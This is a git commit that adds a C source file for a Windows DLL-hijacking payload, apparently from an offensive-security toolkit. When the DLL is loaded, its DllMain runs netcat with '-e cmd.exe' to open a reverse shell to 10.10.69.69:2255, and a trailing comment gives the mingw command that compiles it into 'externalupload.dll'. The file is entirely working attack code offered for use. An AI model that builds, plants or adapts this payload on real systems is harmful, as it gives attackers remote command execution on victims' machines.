6a64ec0fe6bf03b64a582a6b1b35dd62cca0fcc8
babywyrm <55672787+babywyrm@users.noreply.github.com>
2023-10-30 19:42:07 -0700

    Create hijack_.c

---
+++ AD/dll/hijack_.c
@@ -0,0 +1,29 @@
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+            i = system("c:\\programdata\\nc.exe 10.10.69.69 2255 -e cmd.exe");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+//
+//
+// // x86_64-w64-mingw32-gcc dll-hijack.c --shared -o externalupload.dll
+//
+//
